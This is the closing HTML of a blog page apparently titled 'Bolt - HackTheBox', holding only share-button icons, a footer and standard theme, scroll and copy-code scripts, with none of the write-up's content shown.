                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Bolt - HackTheBox on telegram"
        href="https://telegram.me/share/url?text=Bolt%20-%20HackTheBox&amp;url=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fbolt%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://lavatann.github.io">Lavatann</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
